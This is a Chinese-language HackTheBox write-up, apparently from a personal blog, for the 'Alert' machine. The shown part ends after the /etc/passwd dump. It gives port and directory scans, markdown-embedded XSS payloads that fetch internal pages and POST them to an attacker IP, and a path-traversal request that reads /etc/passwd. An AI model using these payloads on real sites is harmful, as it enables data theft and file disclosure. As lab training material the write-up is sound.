@@ -1,0 +1,320 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sgg5joot><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/favicon.png"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Zumpyx Blog" href="https://blog.zumpyx.com/rss.xml"><meta name="generator" content="Astro v7.1.0"><meta name="color-scheme" content="light dark"><meta name="theme-color" content="#0b0d11" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#f4f5f7" media="(prefers-color-scheme: light)"><script>
+	(() => {
+		try {
+			const t = localStorage.getItem('theme');
+			if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+			else document.documentElement.removeAttribute('data-theme');
+		} catch {}
+	})();
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0636-alert/"><!-- Primary Meta Tags --><title>Alert · Zumpyx Blog</title><meta name="description" content="Alert is an easy-difficulty Linux machine with a website to upload, view, and share markdown files. The site is vulnerable to cross-site scripting (XSS), which is exploited to access an internal page vulnerable to Arbitrary File Read and leveraged to gain access to a password hash. The hash is then cracked to reveal the credentials leveraged to gain `SSH` access to the target. Enumeration of processes running on the system shows a `PHP` file that is being executed regularly, which has excessive privileges for the management group our user is a member of and allows us to overwrite the file for code execution as root."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0636-alert/"><meta property="og:title" content="Alert · Zumpyx Blog"><meta property="og:description" content="Alert is an easy-difficulty Linux machine with a website to upload, view, and share markdown files. The site is vulnerable to cross-site scripting (XSS), which is exploited to access an internal page vulnerable to Arbitrary File Read and leveraged to gain access to a password hash. The hash is then cracked to reveal the credentials leveraged to gain `SSH` access to the target. Enumeration of processes running on the system shows a `PHP` file that is being executed regularly, which has excessive privileges for the management group our user is a member of and allows us to overwrite the file for code execution as root."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0636-alert/"><meta name="twitter:title" content="Alert · Zumpyx Blog"><meta name="twitter:description" content="Alert is an easy-difficulty Linux machine with a website to upload, view, and share markdown files. The site is vulnerable to cross-site scripting (XSS), which is exploited to access an internal page vulnerable to Arbitrary File Read and leveraged to gain access to a password hash. The hash is then cracked to reveal the credentials leveraged to gain `SSH` access to the target. Enumeration of processes running on the system shows a `PHP` file that is being executed regularly, which has excessive privileges for the management group our user is a member of and allows us to overwrite the file for code execution as root."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.BMe4uPxC.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}
+main[data-astro-cid-sgg5joot]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-sgg5joot]{width:100%}.hero-image[data-astro-cid-sgg5joot] img[data-astro-cid-sgg5joot]{border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--shadow);margin:0 auto;display:block}.prose[data-astro-cid-sgg5joot]{width:720px;max-width:calc(100% - 2em);color:var(--text);margin:auto;padding:1em}.prose[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);border:1px solid var(--border);max-width:100%;height:auto}.prose[data-astro-cid-sgg5joot] a{color:var(--link)}.title[data-astro-cid-sgg5joot]{text-align:center;margin-bottom:1.25em;padding:1.25em 0 .5em;line-height:1.2}.title-row[data-astro-cid-sgg5joot]{justify-content:center;align-items:center;gap:.85rem;margin:0 0 .5em;display:flex}.title-row[data-astro-cid-sgg5joot] .avatar[data-astro-cid-sgg5joot],.title-row[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);object-fit:contain;border:1px solid var(--border);width:52px;height:52px;box-shadow:0 0 20px var(--accent-glow);background:0 0;flex:none}.title[data-astro-cid-sgg5joot] h1[data-astro-cid-sgg5joot]{margin:0;font-size:clamp(1.75rem,4vw,2.5rem)}.date[data-astro-cid-sgg5joot]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;margin-bottom:.65em;font-size:.85rem}.last-updated-on[data-astro-cid-sgg5joot]{opacity:.85;margin-top:.25em;font-style:normal}.meta[data-astro-cid-sgg5joot]{flex-wrap:wrap;justify-content:center;gap:.45em;margin:.85em 0 0;display:flex}.meta[data-astro-cid-sgg5joot] .badge{font-size:.72rem;font-weight:600;font-family:var(--font-mono);letter-spacing:.06em;color:var(--text);border:1px solid var(--border);text-transform:uppercase;background:#ffffff08;border-radius:999px;align-items:center;gap:.35em;padding:.35em .75em;display:inline-flex;box-shadow:inset 0 1px #ffffff08}.meta[data-astro-cid-sgg5joot] .badge.difficulty-very-easy{color:var(--very-easy);background:#9ef01a1a;border-color:#9ef01a52}.meta[data-astro-cid-sgg5joot] .badge.difficulty-easy{color:var(--easy);background:#9fef001f;border-color:#9fef0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-medium{color:var(--medium);background:#ffcc001f;border-color:#ffcc0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-hard{color:var(--hard);background:#ff88001f;border-color:#f806}.meta[data-astro-cid-sgg5joot] .badge.difficulty-insane{color:var(--insane);background:#ff3e3e1f;border-color:#ff3e3e66}.links[data-astro-cid-sgg5joot]{font-size:.9rem;font-family:var(--font-mono);flex-wrap:wrap;justify-content:center;gap:1em;margin-top:.9em;display:flex}.links[data-astro-cid-sgg5joot] a{color:var(--accent);text-decoration:none}.links[data-astro-cid-sgg5joot] a:hover{text-underline-offset:.2em;text-decoration:underline}
+.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
+</style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="prompt" aria-hidden="true" data-astro-cid-nen7h5rs>~/</span><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
+	(() => {
+		const KEY = 'theme';
+		const ORDER = ['system', 'light', 'dark'];
+		const LABELS = {
+			system: '主题：跟随系统',
+			light: '主题：亮色',
+			dark: '主题：暗色',
+		};
+
+		const getStored = () => {
+			try {
+				const v = localStorage.getItem(KEY);
+				if (v === 'light' || v === 'dark' || v === 'system') return v;
+			} catch {}
+			return 'system';
+		};
+
+		const apply = (mode) => {
+			const root = document.documentElement;
+			if (mode === 'light' || mode === 'dark') root.setAttribute('data-theme', mode);
+			else root.removeAttribute('data-theme');
+			try {
+				if (mode === 'system') localStorage.removeItem(KEY);
+				else localStorage.setItem(KEY, mode);
+			} catch {}
+		};
+
+		const syncButton = (mode) => {
+			document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+				btn.setAttribute('data-mode', mode);
+				btn.setAttribute('aria-label', LABELS[mode]);
+				btn.setAttribute('title', `${LABELS[mode]}（点击切换）`);
+				btn.querySelectorAll('.icon').forEach((el) => {
+					el.hidden = true;
+				});
+				const icon = btn.querySelector(`.icon-${mode}`);
+				if (icon) icon.hidden = false;
+			});
+		};
+
+		const mode = getStored();
+		apply(mode);
+		syncButton(mode);
+
+		document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+			btn.addEventListener('click', () => {
+				const cur = getStored();
+				const next = ORDER[(ORDER.indexOf(cur) + 1) % ORDER.length];
+				apply(next);
+				syncButton(next);
+			});
+		});
+
+		// If following system, react to OS changes
+		try {
+			const mq = window.matchMedia('(prefers-color-scheme: dark)');
+			mq.addEventListener?.('change', () => {
+				if (getStored() === 'system') apply('system');
+			});
+		} catch {}
+	})();
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="prose" data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-11-23T00:00:00.000Z">2024-11-23</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.DIjXSayc_ZoGWq3.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>Alert</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#636</span><span class="badge difficulty-easy" data-astro-cid-twh6cqtg>Easy</span><span class="badge" data-astro-cid-twh6cqtg>Linux</span><span class="badge" data-astro-cid-twh6cqtg>alert</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><h2 id="recon--enum">Recon &amp; Enum</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PORT   STATE SERVICE VERSION</span></span>
+<span class="line"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="line"><span>| ssh-hostkey: </span></span>
+<span class="line"><span>|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)</span></span>
+<span class="line"><span>|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)</span></span>
+<span class="line"><span>|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)</span></span>
+<span class="line"><span>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span></span>
+<span class="line"><span>| http-methods: </span></span>
+<span class="line"><span>|_  Supported Methods: HEAD</span></span></code></pre>
+<h3 id="web-dir-scan">Web Dir Scan</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt -u http://alert.htb/</span></span></code></pre>
+<p><img alt="image-20241127214915042.png" loading="lazy" decoding="async" width="1347" height="549" src="/_astro/image-20241127214915042.Dq5zMJzE_21kKat.webp" srcset=""></p>
+<h2 id="shell-as-user">Shell as User</h2>
+<p><img alt="image-20241127152140832.png" loading="lazy" decoding="async" width="1623" height="572" src="/_astro/image-20241127152140832.n5zgK_bs_YzSx5.webp" srcset=""></p>
+<p>页面有一个上传接口，默认上传 .md 文件，注意到 URL 是一个 PHP 网站。</p>
+<p><img alt="image-20241127152430995.png" loading="lazy" decoding="async" width="1276" height="1369" src="/_astro/image-20241127152430995.SXE0BFC9_10C3Tx.webp" srcset=""></p>
+<p>可以渲染 markdown 文件，并生成共享链接</p>
+<p><img alt="image-20241127152534897.png" loading="lazy" decoding="async" width="922" height="744" src="/_astro/image-20241127152534897.DooGwD8Q_2r4vE1.webp" srcset=""></p>
+<p>这里的上传接口是白名单，只允许 .md 文件</p>
+<p><img alt="image-20241127152658097.png" loading="lazy" decoding="async" width="1170" height="391" src="/_astro/image-20241127152658097.DqFm8yaF_1VuQH8.webp" srcset=""></p>
+<p>在网站上方发现了其他功能点，测试一下 MD 的 XSS，然后可以通过这些功能把 XSS 共享过去</p>
+<p>先写一个简单的 Payload，上传后把共享连接提交到 Contac Us</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="markdown"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-light-font-weight:bold;--shiki-dark:#4BF3C8;--shiki-dark-font-weight:inherit"># Title1</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;img src="http://10.10.16.32/logo.png"/&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">good</span></span></code></pre>
+<p><img alt="image-20241127160812689.png" loading="lazy" decoding="async" width="934" height="304" src="/_astro/image-20241127160812689.DGRkWZeI_20Vhwc.webp" srcset=""></p>
+<p>可以看到目标确实有在访问，那么构造 XSS 获取 Cookie，但是没有 Cookie，可以看看受害者视角</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="markdown"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-light-font-weight:bold;--shiki-dark:#4BF3C8;--shiki-dark-font-weight:inherit"># Title1</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;script&gt;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">fetch("http://alert.htb/index.php").then(resp =&gt; resp.text()).then(data =&gt; fetch("http://10.10.16.32/x?r="+${data}));</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;/script&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">good</span></span></code></pre>
+<p><img alt="image-20241127211854072.png" loading="lazy" decoding="async" width="927" height="911" src="/_astro/image-20241127211854072.D1p58S-g_Zxl2Oh.webp" srcset=""></p>
+<p>接收不到信息，用 GET 请求似乎不太行，python 的 http 有不太容易看 POST 数据，干脆用 nc 监听</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="markdown"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-light-font-weight:bold;--shiki-dark:#4BF3C8;--shiki-dark-font-weight:inherit"># Title1</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;script&gt;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">fetch("http://alert.htb/index.php").then(resp =&gt; resp.text()).then(data =&gt; fetch("http://10.10.16.32/", {method: "POST",body: data}));</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;/script&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">good</span></span></code></pre>
+<p><img alt="image-20241127212035476.png" loading="lazy" decoding="async" width="1538" height="1077" src="/_astro/image-20241127212035476.CUcJNWVC_mmSot.webp" srcset=""></p>
+<p>可以看到，页面上是多了个 Messages 标签，那么看一下这个标签的响应</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="markdown"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-light-font-weight:bold;--shiki-dark:#4BF3C8;--shiki-dark-font-weight:inherit"># Title1</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;script&gt;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">fetch("http://alert.htb/index.php?page=messages").then(resp =&gt; resp.text()).then(data =&gt; fetch("http://10.10.16.32/", {method: "POST",body: data}));</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;/script&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">good</span></span></code></pre>
+<p><img alt="image-20241127212224755.png" loading="lazy" decoding="async" width="1556" height="957" src="/_astro/image-20241127212224755.CBDYUTWU_Z1Vrf32.webp" srcset=""></p>
+<p>发现一个文件，那么读取这个文件</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="markdown"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-light-font-weight:bold;--shiki-dark:#4BF3C8;--shiki-dark-font-weight:inherit"># Title1</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;script&gt;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">fetch("http://alert.htb/index.php?page=messages&amp;file=2024-03-10_15-48-34.txt").then(resp =&gt; resp.text()).then(data =&gt; fetch("http://10.10.16.32/", {method: "POST",body: data}));</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;/script&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">good</span></span></code></pre>
+<p><img alt="image-20241127213717184.png" loading="lazy" decoding="async" width="1085" height="1013" src="/_astro/image-20241127213717184.YjNJ51rt_XLBIk.webp" srcset=""></p>
+<p>文件没什么内容，不过这个请求很像是存在 LFI 漏洞，测试一下</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="markdown"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-light-font-weight:bold;--shiki-dark:#4BF3C8;--shiki-dark-font-weight:inherit"># Title1</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;script&gt;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">fetch("http://alert.htb/index.php?page=messages&amp;file=../../../../../../../../../../etc/passwd").then(resp =&gt; resp.text()).then(data =&gt; fetch("http://10.10.16.32/", {method: "POST",body: data}));</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">&lt;/script&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">good</span></span></code></pre>
+<p><img alt="image-20241127213818479.png" loading="lazy" decoding="async" width="1166" height="1030" src="/_astro/image-20241127213818479.nuccoMoM_TXCFV.webp" srcset=""></p>
+<p>读取到 <code>/etc/passwd</code></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>root:x:0:0:root:/root:/bin/bash</span></span>
+<span class="line"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span>
+<span class="line"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></span>
+<span class="line"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></span>
+<span class="line"><span>sync:x:4:65534:sync:/bin:/bin/sync</span></span>
+<span class="line"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></span>
+<span class="line"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></span>
+<span class="line"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></span>
+<span class="line"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></span>
+<span class="line"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></span>
+<span class="line"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></span>
+<span class="line"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></span>
+<span class="line"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></span>
+<span class="line"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></span>
+<span class="line"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span></span>
+<span class="line"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span></span>
+<span class="line"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span></span>
+<span class="line"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></span>
+<span class="line"><span>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span></span>
+<span class="line"><span>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span></span>
+<span class="line"><span>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span></span>
+<span class="line"><span>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span></span>
+<span class="line"><span>syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span></span>
+<span class="line"><span>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span></span>
+<span class="line"><span>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span></span>
+<span class="line"><span>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span></span>
+<span class="line"><span>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span></span>
+<span class="line"><span>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span></span>
+<span class="line"><span>pollinate:x:110:1::/var/cache/pollinate:/bin/false</span></span>
